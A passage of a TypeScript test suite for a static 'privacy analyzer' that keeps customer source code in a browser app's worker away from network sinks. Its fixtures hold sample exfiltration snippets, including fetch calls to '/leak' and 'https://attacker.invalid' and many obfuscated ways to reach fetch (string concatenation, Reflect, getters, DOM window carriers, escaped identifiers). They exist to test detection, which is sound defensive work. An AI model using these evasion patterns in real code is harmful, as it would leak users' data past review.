    validateFindingsProjectionContract();
  }
  if (serverWorker) validateControlPlaneProxyContract();
  if (dispatchModule) validateControlPlaneDispatchModule();
  if (controlPlaneClient) validateControlPlaneClientContract();
  return violations;
}


test("keeps customer source in the worker message path and out of durable or network sinks", async () => {
  const files = await discoverOriginalSources(appRootPath);
  assert.ok(files.some((file) => file.endsWith("lib/browser-review-client.ts")));
  assert.ok(files.some((file) => file.endsWith("workers/heel-review.worker.ts")));
  const violations = [];
  for (const file of files) violations.push(...analyzeSource(file, await readFile(file, "utf8")));
  assert.deepEqual(violations, []);

  const localReviews = await source("lib/local-reviews.ts");
  assert.match(localReviews, /sync_state:\s*["']local_only["']/);
});


test("pins the findings message, result, busy-state, and key-zeroization boundaries", async () => {
  const client = await source("lib/findings-sync-client.ts");
  const worker = await source("workers/heel-review.worker.ts");
  const clientMutations = [
    client.replace(
      "      namespace_key: namespaceBuffer,",
      "      namespace_key: namespaceBuffer,\n      raw_review: pending.reviewJson,",
    ),
    client.replace(
      "      worker.postMessage(message, [namespaceBuffer]);",
      "      worker.postMessage(message, []);",
    ),
  ];
  for (const [index, candidate] of clientMutations.entries()) {
    const violations = analyzeSource(join(appRootPath, "lib/findings-sync-client.ts"), candidate);
    assert.ok(
      violations.some((violation) => violation.includes("unapproved message boundary")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const workerMutations = [
    worker.replace("    namespaceKey.fill(0);", ""),
    worker.replace("    if (ownsOperation) reviewing = false;", "    reviewing = false;"),
    worker.replace("        new Uint8Array(event.data.namespace_key).fill(0);", ""),
    worker.replace(
      "      request_json: requestJson,",
      "      request_json: requestJson,\n      raw_review: request.review_json,",
    ),
  ];
  for (const [index, candidate] of workerMutations.entries()) {
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), candidate);
    assert.ok(
      violations.some((violation) => violation.includes("findings worker")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer detects constant-computed global network mutation", () => {
  const mutation = `
const source = "private";
globalThis["fet" + "ch"]("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/mutation.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink fetch")), violations.join("\n"));
});


test("the privacy analyzer detects an executable direct fetch alias", () => {
  const mutation = `
const source = "private";
const sink = fetch;
sink("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/alias-mutation.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink alias sink")), violations.join("\n"));
});


test("the privacy analyzer follows computed-global destructuring and assignment aliases", () => {
  const mutation = `
const source = "private";
const { ["fet" + "ch"]: sink } = globalThis;
let nested;
nested = sink;
nested("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/propagated-alias.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink alias sink")), violations.join("\n"));
  assert.ok(violations.some((violation) => violation.includes("network sink alias nested")), violations.join("\n"));
});


test("the privacy analyzer rejects property and object carriers at capability acquisition", () => {
  const mutations = [
    `
const source = "private";
const holder = {};
holder.sink = fetch;
holder.sink("/leak", {body: source});
`,
    `
const source = "private";
const holder = {sink: fetch};
holder.sink("/leak", {body: source});
`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/property-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink capability reference fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects array, closure, return, and argument carriers", () => {
  const mutations = [
    `const holder = [fetch]; holder[0]("/leak");`,
    `const holder = () => fetch; holder()("/leak");`,
    `function holder() { return fetch; } holder()("/leak");`,
    `const carry = (authority) => authority; carry(fetch)("/leak");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/authority-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink capability reference fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects Reflect get, apply, and construct retrieval", () => {
  const mutations = [`
const source = "private";
const sink = Reflect.get(globalThis, "fet" + "ch");
sink("/leak", {body: source});
`, `
const sink = Reflect.apply(Reflect.get, Reflect, [globalThis, "fetch"]);
`, `
const Socket = Reflect.construct(Reflect.get(globalThis, "Web" + "Socket"), ["wss://invalid"]);
`];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(join(appRootPath, `components/nested/reflect-${index}.ts`), mutation);
    assert.ok(
      violations.some((violation) => violation.includes("reflective network capability lookup")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects descriptor and legacy getter retrieval", () => {
  const mutations = [
    `const sink = Object.getOwnPropertyDescriptor(globalThis, "fetch").value;`,
    `const sink = globalThis.__lookupGetter__("fet" + "ch");`,
    `const sink = Object.prototype.__lookupGetter__.call(globalThis, "fetch");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-getter-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective network capability lookup fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects reflective method references in every carrier", () => {
  const mutations = [
    `const get = Reflect.get;`,
    `const descriptor = Object.getOwnPropertyDescriptor;`,
    `const holder = {sink: Reflect["g" + "et"]};`,
    `const holder = {}; holder.sink = Object["getOwn" + "PropertyDescriptor"];`,
    `const legacy = globalThis["__lookup" + "Getter__"];`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-authority-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective method authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects copying Reflect and Object roots", () => {
  const mutations = [
    `const R = Reflect; R.get(globalThis, "fetch");`,
    `const O = Object; O.getOwnPropertyDescriptor(globalThis, "fetch");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects ambient-root copying and variable-key destructuring", () => {
  const mutations = [
    `const key = "fetch"; const {[key]: sink} = globalThis;`,
    `const root = globalThis; root.fetch("/leak");`,
    `const carry = (value) => value; carry(window);`,
    `function copied() { return self; }`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/ambient-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("ambient root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects Window authority through document, top, parent, and frames", () => {
  const roots = ["document.defaultView", "top", "parent", "frames"];
  for (const [index, root] of roots.entries()) {
    const mutation = `
const source = "private";
const key = "fetch";
const {[key]: sink} = ${root};
sink("/leak", {body: source});
`;
    const violations = analyzeSource(
      join(appRootPath, `components/nested/window-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("ambient root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects DOM-derived Window and document carriers regardless of base", () => {
  const mutations = [
    `const element = {} as HTMLElement; const {fetch: sink} = element.ownerDocument.defaultView;`,
    `const frame = {} as HTMLIFrameElement; const root = frame.contentWindow;`,
    `const frame = {} as HTMLIFrameElement; const root = frame["content" + "Document"];`,
    `const element = {} as HTMLElement; const root = element.ownerDocument["default" + "View"];`,
    `const element = {} as HTMLElement; const {["default" + "View"]: root} = element.ownerDocument;`,
    `const frame = {} as HTMLIFrameElement; const {contentWindow: root} = frame;`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/dom-window-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("runtime Window/document authority carrier")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer resolves direct const keys for DOM carriers and network sinks", () => {
  const mutations = [
    `
const documentCarrier = element.ownerDocument as Record<string, unknown>;
const viewKey = "default" + "View";
const root = documentCarrier[viewKey] as Record<string, unknown>;
const sinkKey = "fetch";
const sink = root[sinkKey];
sink("/leak");
`,
    `
const windowKey = "content" + "Window";
const root = frame[windowKey] as Record<string, unknown>;
const sinkKey = "fet" + "ch";
root[sinkKey]("/leak");
`,
    `
const documentKey = "contentDocument";
const {[documentKey]: documentCarrier} = frame;
const viewKey = "defaultView";
const {[viewKey]: root} = documentCarrier;
const sinkKey = "fetch";
const {[sinkKey]: sink} = root;
sink("/leak");
`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/const-dom-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("runtime Window/document authority carrier")),
      `${index}: ${violations.join("\n")}`,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const safe = `
const valueKey = "val" + "ue";
const value = record[valueKey];
const contentTypeKey = "content" + "Type";
const contentType = response[contentTypeKey];
`;
  assert.deepEqual(
    analyzeSource(join(appRootPath, "components/nested/const-safe-key.ts"), safe),
    [],
  );
});


test("the privacy analyzer rejects destructuring and copying the reviewed worker scope alias", () => {
  const mutations = [
    `const key = "fetch"; const {[key]: sink} = scope;`,
    `const copied = scope;`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const sourceText = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
${mutation}
`;
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), sourceText);
    assert.ok(
      violations.some((violation) => violation.includes("worker ambient alias authority reference scope")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects direct use of the captured bootstrap fetch authority", () => {
  const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
const source = "private";
bootstrapFetch("/leak", {method: "POST", body: source});
`;
  const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
  assert.ok(
    violations.some((violation) => violation.includes("bootstrap fetch authority reference bootstrapFetch")),
    violations.join("\n"),
  );
});


test("the privacy analyzer requires the exact reviewed bootstrap declaration", () => {
  const declarations = [
    `const bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);`,
    `var bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);`,
    `let bootstrapFetch = scope.fetch.bind(scope);`,
  ];
  for (const [index, declaration] of declarations.entries()) {
    const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
${declaration}
`;
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
    assert.ok(
      violations.some((violation) => violation.includes("unreviewed bootstrap fetch authority declaration")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects bootstrap aliases, passing, return, reassignment, destructuring, and optional calls", () => {
  const prefix = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
`;
  const mutations = [
    `const alias = bootstrapFetch;`,
    `function pass(value) {} pass(bootstrapFetch);`,
    `function expose() { return bootstrapFetch; }`,
    `const [alias] = [bootstrapFetch];`,
    `bootstrapFetch = () => Promise.reject(new Error("changed"));`,
    `bootstrapFetch?.("/leak");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      `${prefix}\n${mutation}`,
    );
    assert.ok(
      violations.some((violation) => violation.includes("bootstrap fetch authority reference bootstrapFetch")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects non-runtime fetcher calls inside fetchLocal", () => {
  const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
async function fetchLocal(path: string): Promise<Response> {
  const fetcher = bootstrapFetch;
  if (fetcher === null) throw new Error("unavailable");
  return fetcher("/leak", {method: "POST", body: "private"});
}
`;
  const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
  assert.ok(
    violations.some((violation) => violation.includes("bootstrap fetch authority reference fetcher")),
    violations.join("\n"),
  );
});


test("the privacy analyzer rejects every unreviewed fetchLocal reference and call shape", () => {
  const mutations = [
    `void fetchLocal(RUNTIME_ROOT + "pyodide.mjs?source=" + encodeURIComponent(request.source));`,
    `const alias = fetchLocal;`,
    `function pass(value) {} pass(fetchLocal);`,
    `function expose() { return fetchLocal; }`,
    `fetchLocal?.(WHEEL_URL);`,
    `({fetchLocal})["fetch" + "Local"](WHEEL_URL);`,
    `fetchLocal("/heel-runtime/runtime-manifest.json");`,
    `async function boot() { const delayed = () => fetchLocal(WHEEL_URL); }`,
    `async function boot() { const WHEEL_URL = RUNTIME_ROOT + request.source; await fetchLocal(WHEEL_URL); }`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("fetchLocal authority reference")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects the exact post-boot fetchLocal mutation and missing revocations", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  assert.equal(worker.match(/bootstrapFetch = null;/g)?.length, 2);
  assert.deepEqual(analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), worker), []);

  const mutation = worker
    .replaceAll("    bootstrapFetch = null;\n", "")
    .replace(
      "    const response = reviewEntry(request.source, request.answers_json);",
      `    void fetchLocal(RUNTIME_ROOT + "pyodide.mjs?source=" + encodeURIComponent(request.source));
    const response = reviewEntry(request.source, request.answers_json);`,
    );
  const mutationViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    mutation,
  );
  assert.ok(
    mutationViolations.some((violation) => violation.includes("fetchLocal authority reference")),
    mutationViolations.join("\n"),
  );
  assert.ok(
    mutationViolations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
    mutationViolations.join("\n"),
  );

  const missingSuccess = worker.replace(
    "    guardAmbientNetwork();\n    bootstrapFetch = null;",
    "    guardAmbientNetwork();",
  );
  const missingFailure = worker.replace(
    "    acceptingInput = false;\n    bootstrapFetch = null;",
    "    acceptingInput = false;",
  );
  for (const [index, candidate] of [missingSuccess, missingFailure].entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      violations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const shadowedConstant = worker.replace(
    "async function boot(): Promise<void> {",
    `async function boot(WHEEL_URL = "/heel-runtime/leak"): Promise<void> {`,
  );
  const shadowViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    shadowedConstant,
  );
  assert.ok(
    shadowViolations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
    shadowViolations.join("\n"),
  );
});


test("the privacy analyzer rejects composed boot reentry, URL shadowing, and early readiness", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  const shadow = `    const {RUNTIME_MANIFEST_URL} = {
      RUNTIME_MANIFEST_URL: RUNTIME_ROOT + "runtime-manifest.json?source=" + encodeURIComponent(leakedSource),
    };
`;
  const earlyReady = `    {
      acceptingInput = true;
      send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION });
      return;
    }
`;
  const composite = worker
    .replace("let reviewing = false;", `let reviewing = false;\nlet leakedSource = "";`)
    .replace("    const manifestResponse", `${shadow}    const manifestResponse`)
    .replace("    guardDynamicPackages(pyodide);", `${earlyReady}    guardDynamicPackages(pyodide);`)
    .replace(
      "    request = parseRequest(event.data);",
      `    request = parseRequest(event.data);
    leakedSource = request.source;
    void boot();`,
    );
  const compositeViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    composite,
  );
  for (const expected of [
    "runtime URL constant binding",
    "boot authority reference",
    "boot readiness contract",
  ]) {
    assert.ok(
      compositeViolations.some((violation) => violation.includes(expected)),
      `${expected}: ${compositeViolations.join("\n")}`,
    );
  }

  const variants = [
    [worker.replace("    const manifestResponse", `${shadow}    const manifestResponse`), "runtime URL constant binding"],
    [worker.replace("    request = parseRequest(event.data);", "    request = parseRequest(event.data);\n    void boot();"), "boot authority reference"],
    [worker.replace("    guardDynamicPackages(pyodide);", `${earlyReady}    guardDynamicPackages(pyodide);`), "boot readiness contract"],
    [worker.replace("    guardDynamicPackages(pyodide);", "    acceptingInput ||= true;\n    guardDynamicPackages(pyodide);"), "boot readiness contract"],
    [worker.replace(
      `    send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION });`,
      `    send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION, source: leakedSource });`,
    ), "boot readiness contract"],
  ];
  for (const [index, [candidate, expected]] of variants.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      violations.some((violation) => violation.includes(expected)),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer allows only the reviewed boot-time dynamic import", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  assert.deepEqual(analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), worker), []);
  const mutation = worker.replace(
    "    const response = reviewEntry(request.source, request.answers_json);",
    `    void import(/* @vite-ignore */ (RUNTIME_MODULE_URL + "?source=" + encodeURIComponent(request.source)));
    const response = reviewEntry(request.source, request.answers_json);`,
  );
  const violations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    mutation,
  );
  assert.ok(
    violations.some((violation) => violation.includes("dynamic import authority")),
    violations.join("\n"),
  );

  const variants = [
    `void import(RUNTIME_MODULE_URL);`,
    `async function boot() { await import(RUNTIME_MODULE_URL + "?query=1"); }`,
    `const load = (path) => import(path); load(RUNTIME_MODULE_URL);`,
    `importScripts(RUNTIME_MODULE_URL);`,
  ];
  for (const [index, candidate] of variants.entries()) {
    const candidateViolations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      candidateViolations.some((violation) => (
        violation.includes("dynamic import authority")
        || violation.includes("network sink importScripts")
      )),
      `${index}: ${candidateViolations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects every lexical shadow of critical worker authority", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  const exactShadow = worker.replace(
    "  try {\n    const manifestResponse",
    `  try {
    let {bootstrapFetch} = {bootstrapFetch: null};
    const {guardAmbientNetwork} = {guardAmbientNetwork() {}};
    const manifestResponse`,
  );
  const exactViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    exactShadow,
  );
  for (const name of ["bootstrapFetch", "guardAmbientNetwork"]) {
    assert.ok(
      exactViolations.some((violation) => violation.includes(`critical worker binding ${name}`)),
      `${name}: ${exactViolations.join("\n")}`,
    );
  }

  const variants = [
    [worker.replace(
      "async function boot(): Promise<void> {",
      "async function boot(send = () => {}): Promise<void> {",
    ), "send"],
    [worker.replace(
      "  try {\n    const manifestResponse",
      "  try {\n    function fetchLocal() {}\n    const manifestResponse",
    ), "fetchLocal"],
    [worker.replace(
      "  try {\n    const manifestResponse",
      "  try {\n    class scope {}\n    const manifestResponse",
    ), "scope"],
  ];
  for (const [index, [candidate, name]] of variants.entries()) {
    const candidateViolations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      candidateViolations.some((violation) => violation.includes(`critical worker binding ${name}`)),
      `${index}: ${candidateViolations.join("\n")}`,
    );
  }
});


test("the privacy analyzer permits only the reviewed engine and server fetch sites", () => {
  const engine = `
const RUNTIME_ROOT = "/heel-runtime/";
const RUNTIME_MODULE_URL = "/heel-runtime/pyodide.mjs";
const RUNTIME_MANIFEST_URL = "/heel-runtime/runtime-manifest.json";
const WHEEL_FILENAME = "heel.whl";
const WHEEL_URL = \`\${RUNTIME_ROOT}\${WHEEL_FILENAME}\`;
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
let reviewEntry: PyodideCallable | null = null;
let findingsEntry: PyodideCallable | null = null;
async function fetchLocal(path: string): Promise<Response> {
  const fetcher = bootstrapFetch;
  if (fetcher === null || !path.startsWith(RUNTIME_ROOT) || path.includes("..")) {
    throw new Error("runtime asset path is unavailable");
  }
  const response = await fetcher(path, {
    cache: "no-store",
    credentials: "same-origin",
    redirect: "error",
  });
  new URL(response.url || path, scope.location.href);
  return response;
}
function send(value: Record<string, unknown>): void { scope.postMessage(JSON.stringify(value)); }
function guardProperty(owner: Record<string, unknown>, name: string): void {
  Object.defineProperty(owner, name, {value: () => { throw new Error("disabled"); }});
}
function guardAmbientNetwork(): void {
  const ambient = scope as unknown as Record<string, unknown>;
  for (const name of ["fetch", "XMLHttpRequest", "WebSocket", "EventSource"]) {
    guardProperty(ambient, name);
  }
}
function guardDynamicPackages(pyodide: HeelPyodideRuntime): void {}
scope.onmessage = () => {};
let acceptingInput = false;
async function boot(): Promise<void> {
  try {
    await fetchLocal(RUNTIME_MANIFEST_URL);
    await fetchLocal(WHEEL_URL);
    await import(/* @vite-ignore */ RUNTIME_MODULE_URL);
    guardDynamicPackages({} as HeelPyodideRuntime);
    guardAmbientNetwork();
    bootstrapFetch = null;
    acceptingInput = true;
    send({type: "ready", protocol_version: WORKER_PROTOCOL_VERSION});
  } catch {
    acceptingInput = false;
    bootstrapFetch = null;
    send({
      type: "fatal",
      protocol_version: WORKER_PROTOCOL_VERSION,
      code: "engine_unavailable",
      message: PUBLIC_ERRORS.engine_unavailable,
    });
  }
}
void boot();
`;
  const server = `
async function route(request, env, ctx) {
  const asset = await env.ASSETS.fetch(request);
  return handler.fetch(asset, env, ctx);
}
`;
  assert.deepEqual(
    analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), engine),
    [],
  );
  assert.deepEqual(
    analyzeSource(join(appRootPath, "worker/index.ts"), server),
    [],
  );
  assert.deepEqual(
    analyzeSource(join(appRootPath, "lib/safe-object.ts"), `
Object.freeze({});
Object.entries({});
Object.keys({});
Object.is(0, -0);
Object.fromEntries([]);
`),
    [],
  );
  assert.deepEqual(
    analyzeSource(
      join(appRootPath, "lib/local-reviews.ts"),
      `const database = globalThis.indexedDB;`,
    ),
    [],
  );
  assert.deepEqual(
    analyzeSource(
      join(appRootPath, "lib/findings-sync-queue.ts"),
      `const database = globalThis.indexedDB; const ranges = globalThis.IDBKeyRange;`,
    ),
    [],
  );
  assert.match(
    analyzeSource(
      join(appRootPath, "components/review/Unreviewed.tsx"),
      `const ranges = globalThis.IDBKeyRange;`,
    ).join("\n"),
    /IndexedDB capability outside an approved local-only store/,
  );
});


test("the privacy analyzer pins the private control-plane fetch and route allowlist", async () => {
  const worker = await source("worker/index.ts");
  const dispatch = await source(CONTROL_PLANE_DISPATCH_PATH);
  const analyzeWorker = (text) => analyzeSource(join(appRootPath, "worker/index.ts"), text);
  const analyzeDispatch = (text) => analyzeSource(join(appRootPath, CONTROL_PLANE_DISPATCH_PATH), text);
  assert.deepEqual(analyzeWorker(worker), []);
  assert.deepEqual(analyzeDispatch(dispatch), []);
  const call = "  const outcome = await dispatchControlPlane({";
  const sink = "    const response = await input.binding.fetch(new Request(url, init));";
  const mutations = [
    // Retained H0A cases, re-anchored on the Worker call site (S4) or the dispatch module (S1, S2).
    ["fetch location", analyzeWorker, worker.replace("async function proxyControlPlane(", "async function movedControlPlane("), "not the one reviewed call in proxyControlPlane"],
    ["fetch callee", analyzeDispatch, dispatch.replace(sink, sink.replace("input.binding.fetch(", 'input.binding["fetch"](')), "network sink"],
    ["route broadening", analyzeWorker, worker.replace('  return "";\n}', "  return upstreamPath;\n}"), "route allowlist is not the reviewed exact contract"],
    ["public fetch fallback in the worker", analyzeWorker, worker.replace(call, `  await fetch(new Request(new URL(upstreamPath, controlPlaneOrigin)));\n${call}`), "network sink"],
    ["public fetch fallback in the dispatch module", analyzeDispatch, dispatch.replace(sink, sink.replace("input.binding.fetch(", "fetch(")), "network sink"],
    ["legacy fixed destination", analyzeDispatch, dispatch.replace("new URL(input.upstreamPath, origin)", 'new URL(input.upstreamPath, "https://heel-control-plane.internal")'), "literal destination"],
    ["unbounded request body", analyzeDispatch, dispatch.replace("input.body!.pipeThrough(new FixedLengthStream(input.contentLength))", "input.body!"), "FixedLengthStream pipe"],
    ["redirect forwarding", analyzeDispatch, dispatch.replace("if (response.status >= 300 && response.status <= 399)", "if (response.status === 399)"), "missing exact if (response.status >= 300"],
    ["request header copying", analyzeWorker, worker.replace("const headers = new Headers();", "const headers = new Headers(source);"), "request/response header allowlists"],
    [
      "response header copying",
      analyzeWorker,
      worker.replace(
        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers(response.headers);',
      ),
      "request/response header allowlists",
    ],
    ["query acceptance", analyzeWorker, worker.replace('      if (requestUrl.search !== "") return proxyError(400, "invalid control plane request", csp);\n', ""), "requestUrl.search"],
  ];
  assert.equal(new Set(mutations.map(([label]) => label)).size, mutations.length);
  for (const [label, analyze, mutated, violation] of mutations) {
    assert.notEqual(mutated, analyze === analyzeWorker ? worker : dispatch, `${label} mutation did not apply`);
    const violations = analyze(mutated);
    assert.ok(violations.some((found) => found.includes(violation)), `${label}: ${violations.join("\n")}`);
  }
});


test("the edge keeps canary human and runner-result authorities on exact route and header families", async () => {
  const worker = await source("worker/index.ts");
  for (const fragment of [
    "const CANARY_APPROVAL_PROJECTION_ROUTE = new RegExp(",
    "const CANARY_RUN_ROUTE = new RegExp(",
    "const CANARY_RUN_EVENTS_ROUTE = new RegExp(",
    "const CANARY_RUN_APPROVE_ROUTE = new RegExp(",
    "const CANARY_RUN_STOP_ROUTE = new RegExp(",
    "const CANARY_DISCLOSURE_PERMIT_ROUTE = new RegExp(",
    "const CANARY_DISCLOSURE_LOCAL_ROUTE = new RegExp(",
    "const CANARY_FINDINGS_ROUTE = new RegExp(",
    "const RUNNER_RESULT_PROJECTION = new RegExp(",
    "const MAX_RUNNER_RESULT_PROJECTION_BODY_BYTES = 272 * 1024;",
    "const RUNNER_NEXT_NONCE = /^[A-Za-z0-9+/]{43}=$/;",
    "const humanCanary = isHumanCanaryRoute(method, upstreamPath);",
    "const runnerResultProjection = RUNNER_RESULT_PROJECTION.test(upstreamPath);",
    'headers.set("If-Heel-Control-Generation", controlGeneration);',
    'if (!CANARY_IDEMPOTENCY_KEY.test(idempotencyKey)) throw new InvalidControlPlaneRequest();\n    headers.set("Idempotency-Key", idempotencyKey);',
  ]) assert.equal(worker.split(fragment).length - 1, 1, `missing exact ${fragment}`);

  assert.doesNotMatch(worker, /startsWith\("\/v1\/.*(?:runs|jobs|targets)/);
});


test("the privacy analyzer pins the browser client to the same-origin closed control plane", async () => {
  const client = await source("lib/heel-cloud-api.ts");
  assert.deepEqual(analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), client), []);
  const mutations = [
    {
      label: "external fetch",
      source: client.replace("return fetch(path, init);", 'return fetch("https://attacker.invalid", init);'),
      violation: "network sink",
    },
    {
      label: "query acceptance",
      source: client.replace(' || path.includes("?")', ""),
      violation: "path.includes",
    },
    {
      label: "cross-origin credentials",
      source: client.replace('credentials: "same-origin",', 'credentials: "include",'),
      violation: "credentials",
    },
    {
      label: "redirect following",
      source: client.replace('redirect: "error",', 'redirect: "follow",'),
      violation: "redirect",
    },
  ];
  for (const mutation of mutations) {
    assert.notEqual(mutation.source, client, `${mutation.label} mutation did not apply`);
    const violations = analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), mutation.source);
    assert.ok(
      violations.some((violation) => violation.includes(mutation.violation)),
      `${mutation.label}: ${violations.join("\n")}`,
    );
  }
});

test("S1/S2: the dispatch module is the only private sink and names no ambient authority", async () => {
  const dispatch = await source(CONTROL_PLANE_DISPATCH_PATH).catch(() => null);
  assert.notEqual(dispatch, null, `${CONTROL_PLANE_DISPATCH_PATH} is absent`);
  const analyze = (text) => analyzeSource(join(appRootPath, CONTROL_PLANE_DISPATCH_PATH), text);
  assert.deepEqual(analyze(dispatch), []);
  assert.ok(dispatch.split("\n").length <= 121, "the dispatch module exceeds 120 lines");
  const url = "  const url = new URL(input.upstreamPath, origin);";
  const sink = "    const response = await input.binding.fetch(new Request(url, init));";
  const statement = (code) => dispatch.replace(url, `  ${code}\n${url}`);
  const forbidden = (name) => `forbidden identifier ${name}`;
  // The Opus assignment red list, plus escaped spellings that only the normalized token value reveals.
  const red = [
    ["arguments", statement("const extra = arguments.length;"), forbidden("arguments")],
    ["escaped arguments", statement("const extra = \\u0061rguments.length;"), forbidden("arguments")],
    ["braced escaped arguments", statement("const extra = \\u{61}rguments.length;"), forbidden("arguments")],
    ["globalThis", statement("const extra = globalThis;"), forbidden("globalThis")],
    ["self", statement("const extra = self;"), forbidden("self")],
    ["Reflect", statement("const extra = Reflect;"), forbidden("Reflect")],
    ["Proxy", statement("const extra = Proxy;"), forbidden("Proxy")],
    ["eval", statement('const extra = eval("1");'), forbidden("eval")],
    ["Function", statement("const extra = Function;"), forbidden("Function")],
    ["prototype", statement("const extra = Object.prototype;"), forbidden("prototype")],
